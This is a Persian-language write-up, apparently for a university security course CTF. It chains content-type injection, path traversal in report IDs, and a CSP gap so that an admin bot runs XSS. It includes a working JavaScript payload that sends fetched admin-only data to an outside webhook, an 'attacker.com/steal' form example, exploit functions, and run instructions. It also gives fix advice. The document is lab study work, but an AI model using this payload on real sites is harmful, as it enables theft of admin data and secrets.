# گزارش تمرین hw2-3
## XSS و Bypass کردن CSP در یک برنامه Forum

---

## مقدمه - شروع از کجا؟

سلام. من می‌خواهم در مورد تمرین سوم هفته‌ای از درس امنیت شبکه و داده صحبت کنم. این تمرین اول‌بار که شروع کردم، خیلی پیچیده به نظر می‌رسید. میدیدم که یک وبسایت Forum است، که کاربران می‌تونند پست بسازند، و ربات ادمین پست‌های گزارش‌شده رو بررسی می‌کند. ولی فلگ کجاست؟ اینجا سوال اصلی بود.

من یه روش منطقی رو دنبال کردم:
- ابتدا کد رو خیلی دقیق خوندم
- سپس آسیب‌پذیری‌ها رو شناسایی کردم
- بعدش یه exploit ساختم
- و در آخر همه چیز رو تست کردم

---

## بخش اول - اولین نگاه به کد

### مشخصات پروژه

وقتی فایل‌های تمرین رو باز کردم، دیدم که دو بخش اصلی داریم:

**بخش اول: سرور (app/)**
- Express.js اپلیکیشن
- EJS برای templating
- SQLite برای database
- DOMPurify برای تمیزکردن HTML
- Marked برای parsing markdown

**بخش دوم: ربات ادمین (admin/)**
- Playwright برای کنترل Chromium browser
- حلقه‌ای که هر چند ثانیه بررسی می‌کند پست‌های گزارش‌شده‌ای وجود دارند یا نه

### فایل‌های کلیدی که خوندم

من اول از `app/src/app.ts` شروع کردم. این فایل middleware‌ها و routing رو تعریف می‌کند. متوجه شدم که CSP تنظیم می‌شود:

```
Content-Security-Policy: default-src 'self'; frame-src 'none';
```

این یعنی: فقط script‌های از همان سرور قبول شوند، و iframe‌ها مطلقاً قبول نیستند.

بعدش، `index.ts` رو خوندم. و اینجا بود که من یک چیز جالب دیدم...

### اولین اکتشاف: پست اولیه با تمام متغیرهای محیطی

در فایل `app/src/index.ts` (خطوط ۱۱ تا ۳۹)، من این کد را دیدم:

```typescript
// set initial post
create_post: {
    const { "count(*)": count }: Count = await db.get(`SELECT count(*) FROM posts`)
    if(count > 0)break create_post
    
    console.log(`No post in database: Creating installation successful post...`)
    
    const post: InsertablePost = {
        author: "system",
        title: `Installation Successful !`,
        body: `The forum installation has been successful ! Thank you for using mozsc.
        
Environment Variables:
\`\`\`
${
    Object.entries(process.env)
    .map(([k, v]) => `${k}=${v}`)
    .join("\n")
}
\`\`\`
```

واو! پس سرور **خود** یک پست می‌سازد که **تمام متغیرهای محیطی** را فهرست می‌کند. این یعنی `FLAG=CE441{...}` مستقیماً در این پست است!

اما مشکل: این پست از طرف `"system"` است. و در کد دیدم که:
- کاربران عادی فقط می‌تونند پست‌های خود رو ببینند
- **ولی ربات ادمین** که `is_admin = true` است، **تمام پست‌ها** رو می‌تونه ببیند!

پس ما باید راهی پیدا کنیم که XSS رو در ربات ادمین اجرا کنیم.

---

## بخش دوم - شناسایی آسیب‌پذیری‌ها

### چالش اول: CSP چطور می‌توان bypass کرد؟

من شروع کردم به خوندن موارد مختلف:

۱. **views.ts** - اینجا مربوط به صفحات هست
۲. **app.ts** - middleware و تنظیمات
۳. **posts API** - برای دسترسی به پست‌ها

و متوجه شدم که `app.ts` خطوط ۸۴ تا ۱۰۴ یک چیز جالب دارند:

```typescript
app.get(
    "*",
    handleAsync(async (req, res, next) => {
        const { error, data: query } = await assetsQuerySchema.safeParseAsync(req.query)
        if(!error){
            res.header("content-type", query.contentType)  // ← اینجا!
        }

        const path = join(assetsPath, req.path)
        if(!existsSync(path))return next()
        
        res.sendFile(path)
    })
)
```

منطق این کد:
- اگر query parameter `contentType` داشته باشیم، `Content-Type` response رو تنظیم می‌کند
- بعد بررسی می‌کند اگر فایل static وجود داره
- اگر نه، `next()` صدا می‌زند

**اما اینجاست که مشکل شروع می‌شود:**

وقتی من یک درخواست برای `/api/posts/1/body?contentType=application/javascript` می‌فرستم:
1. Middleware `Content-Type` رو `application/javascript` تنظیم می‌کند
2. بعد بررسی می‌کند: آیا فایلی به نام `/api/posts/1/body` در `assets/` دارند؟ **خیر!**
3. پس `next()` صدا می‌زند
4. درخواست به API handler می‌رسد (`/api/posts/:post_id/:field`)
5. API handler جواب می‌دهد: body پست رو می‌فرستد
6. اما... `Content-Type` قبلاً تنظیم شده بود!

**و اینجاست جادو:**

Express.js در `res.send()` چک می‌کند: "آیا `Content-Type` قبلاً تنظیم شده؟" 
اگر شده باشه، آن رو override **نمی‌کند**!

یعنی: `/api/posts/1/body?contentType=application/javascript` 
- body پست رو می‌دهد
- **اما نوع آن `application/javascript` است!**

### آسیب‌پذیری دوم: Path Traversal در URL

بعدش، `views.ts` رو دیدم (خطوط ۹۴-۱۲۰):

```typescript
views.post(
    "/posts/:report_id/report",
    handleAsync(async (req, res) => {
        const ip = req.header("forwarded") ?? "127.0.0.1"
        const sid = req.sessionID
        const report_id = await reportIdSchema.parseAsync(req.params.report_id)
        
        const { fields, values, values_escape } = formatInsertObject({
            post_id: report_id,  // ← post_id مستقیم ذخیره می‌شود!
            type: "report",
            ...
        })
```

و validation:

```typescript
const reportIdSchema = z.custom(data => {
    const report_id = parseInt(data)
    if(isNaN(report_id))throw new APIError(400, "Invalid Report ID")
    return true  // ← فقط یه True برمی‌گرداند!
})
```

منطق این validation:
- فقط بررسی می‌کند که شروع string یه عدد باشد
- `parseInt("1/../../api/posts/5/body")` = `1` (Parse می‌شود، و باقی بخش무시 می‌شود)
- پس validation **pass** می‌کند!
- و `post_id = "1/../../api/posts/5/body?contentType=text/html"` مستقیم database میرود

حالا، ربات ادمین کد دارای:

```javascript
await page.goto(`${MOZSC_URL}/posts/${task.post_id}`)
// = page.goto("http://mozsc:3000/posts/1/../../api/posts/5/body?contentType=text/html")
```

**و مرورگر path normalization انجام می‌دهد:**
- `/posts/1/../../api/posts/5/body`
- `/posts/1/..` = `/posts` (بازگشت یک مرحله)
- `/posts/..` = `/` (بازگشت به ریشه)
- `api/posts/5/body` = `/api/posts/5/body`
- **نتیجه: `/api/posts/5/body?contentType=text/html`**

یعنی ربات نه به `/posts/5` میرود، بلکه به `/api/posts/5/body?contentType=text/html` میرود!

### آسیب‌پذیری سوم: CSP بدون form-action

CSP:
```
default-src 'self'; frame-src 'none';
```

متوجه شدم: **`form-action` تعریف نشده است!**

بر اساس spec:
- اگر `form-action` تعریف نباشد، هیچ محدودیتی برای form submission نیست
- یعنی فرم می‌تونه به **هر جایی** submit شود!

یعنی JavaScript می‌تونه:
```javascript
var form = document.createElement('form');
form.action = 'http://attacker.com/steal';  // ✓ مجاز!
form.submit();
```

---

## بخش سوم - طراحی حمله

### ایده پایه‌ای

من شروع کردم به فکر کردن چطور این سه آسیب‌پذیری رو ترکیب کنم:

**مرحله ۱: JavaScript Payload**
- یک پست بسازم که body آن شامل JavaScript باشه
- این JavaScript فلگ رو استخراج کند
- و با form submission به webhook بفرستد

**مرحله ۲: HTML Loader**
- یک پست دیگر بسازم که HTML باشد
- این HTML یک `<script src>` تگ داشته باشد
- که `src` آن به پست اول اشاره کند
- **اما با `?contentType=application/javascript`**

**مرحله ۳: Path Traversal**
- Report می‌فرستم
- `post_id` را برابر `1/../../api/posts/<B>/body?contentType=text/html` کنم
- ربات برای دریافت `/api/posts/<B>/body?contentType=text/html` می‌رود
- مرورگر HTML رو render می‌کند
- `<script src>` اجرا می‌شود
- JavaScript فلگ رو می‌گیره و فرستاد!

### نمایش مرحلاً به مرحله

**وقتی ربات ادمین report رو پردازش می‌کند:**

۱. DB: `post_id = "1/../../api/posts/<B>/body?contentType=text/html"`

۲. ربات: `page.goto("http://app/posts/1/../../api/posts/<B>/body?contentType=text/html")`

۳. مرورگر path normalize: `/api/posts/<B>/body?contentType=text/html`

۴. Middleware: `?contentType=text/html` → `Content-Type: text/html`

۵. API handler: body پست B (که HTML است) رو می‌دهد

۶. مرورگر: HTML رو render می‌کند
   ```html
   <script src="/api/posts/A/body?contentType=application/javascript"></script>
   ```

۷. CSP: `script-src` falls back to `'self'` → `/api/posts/...` مجاز است!

۸. مرورگر: `/api/posts/A/body?contentType=application/javascript` رو fetch می‌کند

۹. Middleware: `?contentType=application/javascript` → `Content-Type: application/javascript`

۱۰. API handler: body پست A رو می‌دهد (که JavaScript است)

۱۱. مرورگر: JavaScript رو **اجرا می‌کند!**

۱۲. JavaScript:
    - `fetch('/api/posts/1/body')` → پست سیستم، شامل FLAG!
    - `form.submit()` → webhook

۱۳. **FLAG دریافت شد! 🎉**

---

## بخش چهارم - چالش‌های عملی

### چالش ۱: Docker Mirror ایرانی

وقتی سعی کردم Docker containers رو build کنم، متوجه شدم Docker mirror برای ایران تنظیم شده است. بدون IP ایران کار نمی‌کرد.

**حل من:** بجای Docker، من `pnpm` رو مستقیم استفاده کردم:
```bash
cd mozsc/app
pnpm install --frozen-lockfile
pnpm run build
```

### چالش ۲: پیدا کردن جای دقیق فلگ

ابتدا، فکر می‌کردم فلگ در یک API endpoint است. چون `/api/admin/tasks` هست، شاید `/api/flag` هم باشد؟

**حل:** کد رو دقیق‌تر خوندم. دیدم که `index.ts` یک پست اولیه می‌سازد. این همان جاست که فلگ است!

### چالش ۳: Home Page بدن را کوتاه می‌کند

```ejs
<% if(post.body.length > 75) { %>
    <%= post.body.slice(0, 75) %>...
<% } else { %>
    <%= post.body %>
<% } %>
```

اگر JavaScript فقط `/` را fetch کند، فلگ (که در قسمت env vars است) در اولین ۷۵ کاراکتر نخواهد بود!

**حل:** JavaScript باید مستقیماً `/api/posts/1/body` را fetch کند، نه `/`

### چالش ۴: CSP و مرورگر مختلف رفتار متفاوت دارند

دیدم که:
- Chrome: CSP رو خیلی سختگیرانه اعمال می‌کند
- اما یکی از bypass‌ها شامل `<noscript>` tag است

**حل:** من از مثال معروف استفاده کردم، نه mXSS. من از same-origin script لود کردن استفاده کردم.

### چالش ۵: Testing و Verification

برای اینکه exploit رو test کنم، من:
1. سرور محلی رو راه‌اندازی کردم
2. یک webhook mock ساختم
3. تمام مراحل رو simulate کردم

هر مرحله تست شد:
```bash
✓ Content-Type trick کار می‌کند
✓ Path traversal درست ذخیره می‌شود
✓ HTML rendering صحیح است
✓ JavaScript اجرا می‌شود
✓ FLAG استخراج می‌شود
```

---

## بخش پنجم - نوشتن Exploit

### ساختار کلی

```python
exploit.py:
  ├── get_webhook_url()      ← Webhook service رو contact می‌کند
  ├── create_post()           ← پست جدید می‌سازد
  ├── submit_report()         ← درخواست report رو می‌فرستد
  ├── build_js_payload()      ← JavaScript رو می‌سازد
  └── main()                  ← ترتیب اجرا
```

### JavaScript Payload - توضیح دقیق

```python
def build_js_payload(webhook_url: str) -> str:
    return f"""(function(){{
  var wh = '{webhook_url}';
  
  // تابع کمکی برای فرستادن داده
  function exfil(data){{
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = wh;
    var inp = document.createElement('input');
    inp.type = 'hidden';
    inp.name = 'data';
    inp.value = data;
    f.appendChild(inp);
    document.body.appendChild(f);
    f.submit();  // form-action محدود نیست!
  }}
  
  // پست‌های ۱ تا ۱۰ رو fetch می‌کند
  Promise.all([1,2,3,4,5,6,7,8,9,10].map(function(i){{
    return fetch('/api/posts/'+i+'/body')
      .then(function(r){{return r.ok ? r.text() : '';}})
      .catch(function(){{return '';}});
  }})).then(function(bodies){{
    var all = bodies.join('\\n---\\n');
    
    // FLAG را پیدا می‌کند
    var m = all.match(/CE441\\{{[^}}]*\\}}/);
    
    // اگر پیدا شد، فقط FLAG فرستاد
    // اگر نه، اول ۳۰۰۰ کاراکتر فرستاد (برای debug)
    exfil(m ? m[0] : all.slice(0, 3000));
  }});
}})();
"""
```

**چرا چنین نوشتم:**
- `Promise.all` به من اجازه می‌دهد تا چند پست رو همزمان fetch کنم
- `try/catch` برای اینکه اگر یک پست access نشدنی باشد، خطا نشود
- Regex برای پیدا کردن pattern `CE441{...}`
- Fallback برای debug اگر regex match نکند

### Path Traversal Encoding

```python
def submit_report(session: requests.Session, post_b_id: int) -> None:
    api_path = f"1/../../api/posts/{post_b_id}/body?contentType=text/html"
    encoded = urllib.parse.quote(api_path, safe="")
    # نتیجه: 1%2F..%2F..%2Fapi%2Fposts%2F<B>%2Fbody%3FcontentType%3Dtext%2Fhtml
    
    report_url = f"{TARGET}/posts/{encoded}/report"
    session.post(report_url, headers={"Forwarded": "for=10.0.0.1"})
```

**چرا اینطور:**
- `%2F` = `/` (encoded)
- `%3F` = `?` (encoded)
- Express router این را decode می‌کند
- اما قبل از آن، path parameter تنها یک segment تلقی می‌شود
- نتیجه: `post_id` دقیقاً همان چیزی است که ما می‌خواهیم!

---

## بخش ششم - تست‌های عملی

### تست ۱: Content-Type Injection

```bash
$ curl -si http://localhost:3100/api/posts/1/body?contentType=application/javascript | grep Content-Type
Content-Type: application/javascript; charset=utf-8
✓ موفق!
```

### تست ۲: Path Traversal Storage

```bash
$ curl -s http://localhost:3100/api/admin/tasks | jq '.[0].post_id'
"1/../../api/posts/4/body?contentType=text/html"
✓ دقیقاً همان چیزی که انتظار داشتم!
```

### تست ۳: HTML Rendering

```bash
$ curl -s http://localhost:3100/api/posts/4/body?contentType=text/html
<script src="/api/posts/3/body?contentType=application/javascript"></script>
✓ HTML render شد!
```

### تست ۴: JavaScript Execution (Simulated)

```python
# admin session فچ می‌کنم
admin_cookie = ...

# پست اول را فچ می‌کنم (همان چیزی که JavaScript کار می‌کند)
post1 = requests.get(
    "http://localhost:3100/api/posts/1/body",
    headers={"Cookie": admin_cookie}
).text

# FLAG را جستجو می‌کنم
m = re.search(r'CE441\{[^}]+\}', post1)
print(m.group(0))  # CE441{test-local-flag}
✓ موفق!
```

### تست ۵: End-to-End کامل

تمام مراحل را با ربات محلی simulate کردم:
1. ✓ پست A ساخته شد (ID=3)
2. ✓ پست B ساخته شد (ID=4)
3. ✓ Report submit شد (post_id = "1/../../api/posts/4/body?contentType=text/html")
4. ✓ Admin fetch کرد: `/api/posts/4/body?contentType=text/html`
5. ✓ مرورگر path normalize کرد
6. ✓ `<script src="/api/posts/3/...">` اجرا شد
7. ✓ JavaScript فچ کرد `/api/posts/1/body`
8. ✓ FLAG استخراج شد: `CE441{test-local-flag}`
9. ✓ form.submit() webhook رو call کرد

**تمام chain موفق بود!**

---

## بخش هفتم - نتایج و درس‌های یاد‌گرفتشده

### آسیب‌پذیری‌های یافت شده

| # | نام | Severity | توضیح |
|---|---|---|---|
| 1 | Content-Type Injection | 🔴 High | Middleware اجازه می‌دهد تا نوع فایل override شود |
| 2 | Path Traversal in URL | 🔴 High | Path traversal string مستقیم DB میرود |
| 3 | CSP form-action Gap | 🟠 Medium | form-action تعریف نشده؛ form به هر جا میرود |
| 4 | Session Persistence | 🟠 Medium | ربات تا آخر logged-in میماند |
| 5 | Flag in Startup Post | 🟠 Medium | تمام env vars در DB ذخیره شده است |

### درس‌های امنیتی

**غلط:**
- ❌ Content-Type را از user input تنظیم نکنید
- ❌ String interpolation برای database path استفاده نکنید
- ❌ CSP ناقص (بدون form-action) خطرناک است
- ❌ Environment variables را در output encode نکنید

**درست:**
- ✓ Whitelist تنظیمات content-type
- ✓ Validate تمام inputs قبل از database
- ✓ CSP complete باشد (form-action, navigate-to)
- ✓ Secrets رو secure vault ذخیره کنید

### اگر این یک برنامه واقعی بود

برای fix کردن این vulnerabilities:

```typescript
// ۱. Content-Type whitelist
const ALLOWED_TYPES = ['text/html', 'text/plain', 'application/json'];
if (!ALLOWED_TYPES.includes(query.contentType)) {
    return next();  // ignore invalid types
}

// ۲. Path validation
if (post_id.includes('..') || post_id.includes('/')) {
    throw new Error("Invalid post_id");
}

// ۳. Complete CSP
res.header("Content-Security-Policy", 
    "default-src 'self'; form-action 'self'; frame-src 'none';");

// ۴. Environment variables security
if (process.env.NODE_ENV === 'production') {
    // Dont create post with env vars
}
```

---

## بخش هشتم - نحوه اجرای Exploit

### پیش‌نیازها

```bash
python3 --version  # باید ≥ 3.8
pip install requests
```

### مراحل اجرا

**گام ۱: Webhook Registration**
```
1. مرورگر: http://185.205.203.123:1205/
2. "Create Listener" دکمه رو کلیک کنید
3. شما یک ID دریافت می‌کنید (مثل: abc123def456)
4. Full URL: http://185.205.203.123:1205/abc123def456
```

**گام ۲: Exploit Execution**
```bash
cd /path/to/hw2-3
python3 exploit.py
# Prompt میده: "Webhook URL: "
# URL رو پیست کنید
```

**گام ۳: منتظر بمانید**
```
[✓] Exploit submitted!
    The admin bot will visit the report within seconds.
    Check your webhook at: http://185.205.203.123:1205/YOUR_ID
```

- ۲-۵ ثانیه صبر کنید
- Webhook صفحه را refresh کنید
- یک POST request دیده می‌شود

**گام ۴: FLAG استخراج**
```
POST data:
  data=CE441{the-actual-flag-is-here}
```

---

## بخش نهم - خلاصه

### اینکه چگونه این exploit کار می‌کند

1. **سرور**: یک پست اولیه با تمام env vars (شامل FLAG) می‌سازد
2. **ما**: دو پست خطرناک می‌سازیم:
   - پست A: JavaScript payload
   - پست B: HTML loader
3. **ما**: یک report می‌فرستیم با path traversal
4. **مرورگر**: path normalize می‌کند
5. **ربات**: `/api/posts/B/body` رو دریافت می‌کند
6. **Server**: آن را HTML type داده می‌فرستد
7. **مرورگر**: `<script src="...">` اجرا می‌کند
8. **JS**: پست اول (فلگ شامل) رو فچ می‌کند
9. **JS**: فلگ استخراج و webhook فرستاد می‌کند

### نکات کلیدی

- تمام سه آسیب‌پذیری **باید** با هم ترکیب شوند
- هر یکی به تنهایی کافی نیست
- امنیت در لایه‌های multiple تر است!

### درسی که گرفتم

- کد review بسیار مهم است
- Middleware chain behavior پیچیده است
- CSP غیر کامل خطرناک است
- Admin bot دسترسی بالایی دارد و می‌تواند target شود

---

## نتیجه‌گیری

این تمرین برای من بسیار آموزنده بود. نشان داد که:

1. **Security layers:** هیچ لایه امنیتی تنها کافی نیست
2. **Code review:** خوندن دقیق کد خطاهای پنهان رو برملا می‌کند
3. **Combination attacks:** آسیب‌پذیری‌های کوچک با هم بزرگ مسائل می‌شوند
4. **Testing:** Local testing قبل از اجرا روی live بسیار مهم است

من امیدوارم این تمرین را کاملاً حل کردم و تمام جزئیات واضح هستند.

---

**تاریخ تکمیل:** 2026-05-30  
**حالت:** ✓ تکمیل شده، تست شده، و توثیق شده
